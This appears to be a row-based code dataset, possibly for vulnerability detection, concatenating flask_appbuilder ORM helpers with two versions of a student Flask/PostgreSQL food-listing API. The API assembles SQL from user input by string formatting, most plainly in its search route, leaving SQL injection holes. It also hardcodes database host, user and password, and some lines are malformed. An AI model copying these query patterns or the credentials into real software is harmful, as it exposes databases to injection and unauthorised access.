    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/n/flask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",1
80,80,332a9f2c619be399ae94244bb8bd0977fc62bc16,"backend-api/backend-api.py/n/nfrom flask import Flask
from flask import request
import simplejson as json
import psycopg2

"""""" Macros for relation and column names """"""
client_table_name = ""\""Client\""""
client_client_id_col = ""\""ClientID\""""
client_client_rating_col = ""\""Client Rating\""""

client_ratings_table_name = ""\""Client Ratings\""""
client_ratings_client_id_col = ""\""ClientID\""""
client_ratings_reviewer_id_col = ""\""ReviewerID\""""
client_ratings_comments_col = ""\""Comments\""""
client_ratings_rating_col = ""\""Rating\""""

cook_table_name = ""\""Cook\""""
cook_cook_id_col = ""\""CookID\""""
cook_cook_rating_col = ""\""Cook Rating\""""

cook_ratings_table_name = ""\""Cook Rating\""""
cook_ratings_cook_id_col = ""\""CookID\""""
cook_ratings_reviewer_id_col = ""\""ReviewerID\""""
cook_ratings_comments_col = ""\""Comments\""""
cook_ratings_rating_col = ""\""Rating\""""

listing_table_name = ""\""Listing\""""
listing_listing_id_col = ""\""ListingID\""""
listing_cook_id_col = ""\""CookID\""""
listing_food_name_col = ""\""Food Name\""""
listing_price_col = ""\""Price\""""
listing_location_col = ""\""Location\""""
listing_image_col = ""\""Image\""""

listing_tags_table_name = ""\""Listing Tags\""""
listing_tags_listing_id_col = ""\""ListingID\""""
listing_tags_tag_col = ""\""Tag\""""

order_table_name = ""\""Order\""""
order_client_id_col = ""\""ClientID\""""
order_listing_id_col = ""\""ListingID\""""
order_status_col = ""\""Status\""""
order_time_of_order_col = ""\""Time of Order\""""

user_table_name = ""\""User\""""
user_user_id_col = ""\""UserID\""""
user_password_col = ""\""Password\""""
user_fname_col = ""\""FName\""""
user_lname_col = ""\""LName\""""

"""""" Database login details """"""
db_host = ""mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com""
db_name = ""csc301breadwiener""
db_user = ""csc301breadwiener""
db_password = ""team7ithink""

conn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)
app = Flask(__name__)

##################################################
def removeQuotes(stringy):
    """""" Removes the first and last characters (double quotes) from a string, and then return it """"""
    return stringy[1:-1]


#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#
@app.route('/api/getAllListings', methods=['GET'])
def getAllListings():
    all_rows = []

    search_all = conn.cursor()
    search_all.execute(""SELECT {}, {}, {}, {},""
                         "" {}, {} FROM public.{}"".format(listing_listing_id_col,
                                                                          listing_cook_id_col,
                                                                          listing_food_name_col,
                                                                          listing_price_col,
                                                                          listing_location_col,
                                                                          listing_image_col,
                                                                          listing_table_name))

    single_row = search_all.fetchone()

    while single_row is not None:
        all_rows.append(single_row)
        single_row = search_all.fetchone()

    search_all.close()

    rows_to_json(all_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': all_rows})  # convert to string before returning


#--------------------------------------------------- ADD LISTING ---------------------------------------------------#

@app.route('/api/add', methods=['GET', 'POST'])
def addReq():
    if request.method == ""GET"":
        return printTables()
    elif request.method == ""POST"":
        addToDB(request.get_json())
        conn.commit()
        return ""Success""

def encase_in_quotes(stringy):
    return ""\"""" + stringy + ""\""""


""""""
Adds the Listing entry to the PSQL database with the given JSONdata
JSON format is a dictionary where the keys are the column names of the listing, along with
a key ""tagList"" which is a list of tags:

""""""


def addToDB(json_data):
    cur = conn.cursor()
    json_dict = json_data

    list_id = getListId()
    cook_id = json_dict[removeQuotes(listing_cook_id_col)]
    food_name = json_dict[removeQuotes(listing_food_name_col)]
    price = json_dict[removeQuotes(listing_price_col)]
    loc = json_dict[removeQuotes(listing_location_col)]
    image = json_dict[removeQuotes(listing_image_col)]
    tags = json_dict[""tags""]

    sql = ""INSERT INTO %s VALUES (%s, %s, %s, %s, %s, %s)""
	cur.execute(sql, (listing_table_name, list_id, cook_id, food_name, price, loc, image))

    addTags(tags, list_id)


def addTags(tag_list, listing_id):
    """"""
    Adds a list of tags tag_list for a given listing with listing_id to the database
    """"""
    cur = conn.cursor()
    for x in tag_list:
        sql = ""INSERT INTO %s VALUES (%s %s)""
        cur.execute(sql, (listing_tags_table_name, listing_id, x))


def getListId():
    """""" Returns an unused listing_id """"""
    cur = conn.cursor()
    sql = ""SELECT max({}) FROM {}"".format(listing_listing_id_col,
                                          listing_table_name)
    cur.execute(sql)
    maxID = cur.fetchone()
    if maxID[0] == None:
        return 1
    else:
        return maxID[0] + 1


def printTables():
    cur = conn.cursor()
    strout = ""--------------------------ListingTable---------------------------<br>""
    sql = ""SELECT * FROM {}"".format(listing_table_name)
    cur.execute(sql)
    listings = cur.fetchall()
    for x in listings:
        for y in x:
            strout = strout + str(y) + ""||	""
        strout = strout + ""<br>""
    sql = ""SELECT * FROM {}"".format(listing_tags_table_name)
    cur.execute(sql)
    listings = cur.fetchall()
    strout += ""<br><br><br>--------------------------TagTable-------------------------<br>""
    for x in listings:
        for y in x:
            strout = strout + str(y) + ""	""

        strout = strout + ""<br>""
    return strout


#--------------------------------------------------- CANCEL ---------------------------------------------------#


@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])
def cancel(clientId, listingId):
    """"""
    Cancels the order with specified client id and listing id and returns it.
    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already
    been canceled or fulfilled.
    """"""

    in_progress = get_in_progress_order(clientId, listingId)

    if in_progress:
        cancel_order(clientId, listingId)
        output = order_to_json(in_progress)  # want to convert each row into a JSON string

        return output  # convert to string before returning
    else:
        return 'order not found'


def get_in_progress_order(clientId, listingId):
    """"""
    Return the in progress order that corresponds with ClientId and ListingID
    """"""
    matched_rows = []

    order = conn.cursor()
    order.execute(""SELECT t1.\""ClientID\"", t1.\""ListingID\"", t1.\""Status\"", t1.\""Time of Order\"" from public.\""Order\""""
                  "" as t1 WHERE t1.\""ClientID\"" = "" + str(clientId) + "" AND \""ListingID\"" = "" + str(listingId) +
                  "" AND t1.\""Status\"" = \'In progress\'"")

    order_row = order.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = order.fetchone()

    order.close()

    return matched_rows


def cancel_order(clientId, listingId):
    """"""
    given a clientId and listingId cancel the order in progress associated with them
    """"""
    order = conn.cursor()
    order.execute(
        ""UPDATE public.\""Order\"" SET \""Status\"" = 'Canceled' WHERE \""ClientID\"" = "" + str(clientId) +
        "" AND \""ListingID\"" = "" + str(listingId) + "" AND \""Status\"" = \'In progress\'"")
    conn.commit()

    order.close()


def order_to_json(rows):
    """"""
    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.
    """"""
    string = """"
    for i in range(len(rows)):
        string += json.dumps({'ClientID': rows[i][0],
                              'ListingID': rows[i][1],
                              'Status': rows[i][2],
                              'DateTime': rows[i][3].__str__()})
        if i != len(rows) - 1:
            string += "",""

    return string


#--------------------------------------------------- getUserOrders ---------------------------------------------------#


@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])
def getUserOrders(clientId):
    """"""
    Retruns a list of jsons representing tupples in the Orders table for the given client
    """"""

    in_progress = queryOrderUsingClientID(clientId)

    output = order_to_json(in_progress)  # want to convert each row into a JSON string

    return ""["" + output + ""]""  # convert to string before returning


def queryOrderUsingClientID(clientId):
    """"""
    Return a list of Order tuples belonging to the client with the given id.
    """"""
    matched_rows = []

    orders = conn.cursor()
    orders.execute(""SELECT t1.\""ClientID\"", t1.\""ListingID\"", t1.\""Status\"", t1.\""Time of Order\"" from public.\""Order\""""
                   "" as t1 WHERE t1.\""ClientID\"" = "" + str(clientId))

    order_row = orders.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = orders.fetchone()

    orders.close()

    return matched_rows


#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#


completed = ""\'Completed\'""


@app.route(""/api/markComplete/<int:clientID>/<int:listingID>"", methods=['GET'])
def mark_as_complete(clientID, listingID):
    """""" A function that changes the status of the order with listing id listing_id to complete.
        Returns ""Success"" on a sucessful change of the listing id's order to complete.

        @param clientID: the client id number to change the status.
        @param listingID: the listing id number to change the status.
        @rtype: str
    """"""

    sql = \
        """"""
            UPDATE public.{}
            SET {} = {}
            WHERE {} = {} AND {} = {}
        """""".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),
                   order_client_id_col, str(clientID))

    cur = conn.cursor()
    try:
        cur.execute(sql)
        conn.commit()
    except Exception as e:
        raise Exception(e)

    # Check to see if a row in the database has been updated.
    if cur.rowcount == 0:
        raise Exception(""The status of listing id's order was not changed. ClientID or ListingID may be out of range."")
    return ""Success""


#--------------------------------------------------- SEARCH ---------------------------------------------------#


@app.route('/api/search/<string:search_query>', methods=['GET'])
def search(search_query):
    """"""
    Return a string representation of a list of JSON objects. This list contains
    objects that correspond to listings that match names or tags in the search query.
    """"""
    # separate words in search_query with '+' in place of spaces
    search_terms = search_query.split('+')

    # want to remove whitespace and empty elements from the list
    search_terms_filtered = []

    for search_term in search_terms:
        if not search_term.isspace() and not search_term == '':
            search_terms_filtered.append(search_term)

    matched_rows_by_name = get_rows_from_name(search_terms_filtered)

    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)

    matched_rows = matched_rows_by_name + matched_rows_by_tag

    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows

    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': unique_matched_rows})  # convert to string before returning


def get_rows_from_name(search_terms):
    """"""
    Return a list of listing tuples whose Food Names correspond to words in search_terms.
    """"""
    matched_rows = []

    for search_term in search_terms:
        search_names = conn.cursor()
        search_names.execute(""SELECT t1.{}, t1.{}, t1.{}, t1.{},""
                             "" t1.{}, t1.{} FROM public.{} as t1""
                             "" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} ""
                             ""WHERE UPPER(t1.{}) LIKE UPPER(\'%{}%\')"".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_food_name_col,
                                                                              search_term))

        search_names_row = search_names.fetchone()

        while search_names_row is not None:
            matched_rows.append(search_names_row)
            search_names_row = search_names.fetchone()

        search_names.close()

    return matched_rows


def get_rows_from_tag(search_terms):
    """"""
    Return a list of listing tuples whose tags correspond to words in search_terms.
    """"""
    matched_rows = []

    for search_term in search_terms:
        search_tags = conn.cursor()
        search_tags.execute(""SELECT t1.{}, t1.{}, t1.{}, t1.{},""
                             "" t1.{}, t1.{} FROM public.{} as t1""
                             "" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} ""
                             ""WHERE UPPER(t2.{}) LIKE UPPER(\'%{}%\')"".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_tags_tag_col,
                                                                              search_term))

        search_tags_row = search_tags.fetchone()

        while search_tags_row is not None:
            matched_rows.append(search_tags_row)
            search_tags_row = search_tags.fetchone()

        search_tags.close()

    return matched_rows


def rows_to_json(rows):
    """"""
    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.
    """"""
    for i in range(len(rows)):
        rows[i] = json.dumps({'ListingID': rows[i][0],
                                'CookID': rows[i][1],
                                'Food Name': rows[i][2],
                                'Price': rows[i][3],
                                'Location': rows[i][4],
                                'Image': rows[i][5]})


if __name__ == '__main__':
    app.run(host=""0.0.0.0"", port=80)
    # host=""0.0.0.0"", port=80
/n/n/n",0
81,81,332a9f2c619be399ae94244bb8bd0977fc62bc16,"/backend-api/backend-api.py/n/nfrom flask import Flask
from flask import request
import simplejson as json
import psycopg2

"""""" Macros for relation and column names """"""
client_table_name = ""\""Client\""""
client_client_id_col = ""\""ClientID\""""
client_client_rating_col = ""\""Client Rating\""""

client_ratings_table_name = ""\""Client Ratings\""""
client_ratings_client_id_col = ""\""ClientID\""""
client_ratings_reviewer_id_col = ""\""ReviewerID\""""
client_ratings_comments_col = ""\""Comments\""""
client_ratings_rating_col = ""\""Rating\""""

cook_table_name = ""\""Cook\""""
cook_cook_id_col = ""\""CookID\""""
cook_cook_rating_col = ""\""Cook Rating\""""

cook_ratings_table_name = ""\""Cook Rating\""""
cook_ratings_cook_id_col = ""\""CookID\""""
cook_ratings_reviewer_id_col = ""\""ReviewerID\""""
cook_ratings_comments_col = ""\""Comments\""""
cook_ratings_rating_col = ""\""Rating\""""

listing_table_name = ""\""Listing\""""
listing_listing_id_col = ""\""ListingID\""""
listing_cook_id_col = ""\""CookID\""""
listing_food_name_col = ""\""Food Name\""""
listing_price_col = ""\""Price\""""
listing_location_col = ""\""Location\""""
listing_image_col = ""\""Image\""""

listing_tags_table_name = ""\""Listing Tags\""""
listing_tags_listing_id_col = ""\""ListingID\""""
listing_tags_tag_col = ""\""Tag\""""

order_table_name = ""\""Order\""""
order_client_id_col = ""\""ClientID\""""
order_listing_id_col = ""\""ListingID\""""
order_status_col = ""\""Status\""""
order_time_of_order_col = ""\""Time of Order\""""

user_table_name = ""\""User\""""
user_user_id_col = ""\""UserID\""""
user_password_col = ""\""Password\""""
user_fname_col = ""\""FName\""""
user_lname_col = ""\""LName\""""

"""""" Database login details """"""
db_host = ""mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com""
db_name = ""csc301breadwiener""
db_user = ""csc301breadwiener""
db_password = ""team7ithink""

conn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)
app = Flask(__name__)

##################################################
def removeQuotes(stringy):
    """""" Removes the first and last characters (double quotes) from a string, and then return it """"""
    return stringy[1:-1]


#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#
@app.route('/api/getAllListings', methods=['GET'])
def getAllListings():
    all_rows = []

    search_all = conn.cursor()
    search_all.execute(""SELECT {}, {}, {}, {},""
                         "" {}, {} FROM public.{}"".format(listing_listing_id_col,
                                                                          listing_cook_id_col,
                                                                          listing_food_name_col,
                                                                          listing_price_col,
                                                                          listing_location_col,
                                                                          listing_image_col,
                                                                          listing_table_name))

    single_row = search_all.fetchone()

    while single_row is not None:
        all_rows.append(single_row)
        single_row = search_all.fetchone()

    search_all.close()

    rows_to_json(all_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': all_rows})  # convert to string before returning


#--------------------------------------------------- ADD LISTING ---------------------------------------------------#

@app.route('/api/add', methods=['GET', 'POST'])
def addReq():
    if request.method == ""GET"":
        return printTables()
    elif request.method == ""POST"":
        addToDB(request.get_json())
        conn.commit()
        return ""Success""

def encase_in_quotes(stringy):
    return ""\"""" + stringy + ""\""""


""""""
Adds the Listing entry to the PSQL database with the given JSONdata
JSON format is a dictionary where the keys are the column names of the listing, along with
a key ""tagList"" which is a list of tags:

""""""


def addToDB(json_data):
    cur = conn.cursor()
    json_dict = json_data

    list_id = getListId()
    cook_id = json_dict[removeQuotes(listing_cook_id_col)]
    food_name = json_dict[removeQuotes(listing_food_name_col)]
    price = json_dict[removeQuotes(listing_price_col)]
    loc = json_dict[removeQuotes(listing_location_col)]
    image = json_dict[removeQuotes(listing_image_col)]
    tags = json_dict[""tags""]

    sql = ""INSERT INTO %s VALUES (%s, %s, %s, %s, %s, %s)""
	cur.execute(sql, (listing_table_name, list_id, cook_id, food_name, price, loc, image))

    addTags(tags, list_id)


def addTags(tag_list, listing_id):
    """"""
    Adds a list of tags tag_list for a given listing with listing_id to the database
    """"""
    cur = conn.cursor()
    for x in tag_list:
        sql = ""INSERT INTO {} VALUES {}"".format(listing_tags_table_name, str((listing_id, x)))
        cur.execute(sql)


def getListId():
    """""" Returns an unused listing_id """"""
    cur = conn.cursor()
    sql = ""SELECT max({}) FROM {}"".format(listing_listing_id_col,
                                          listing_table_name)
    cur.execute(sql)
    maxID = cur.fetchone()
    if maxID[0] == None:
        return 1
    else:
        return maxID[0] + 1


def printTables():
    cur = conn.cursor()
    strout = ""--------------------------ListingTable---------------------------<br>""
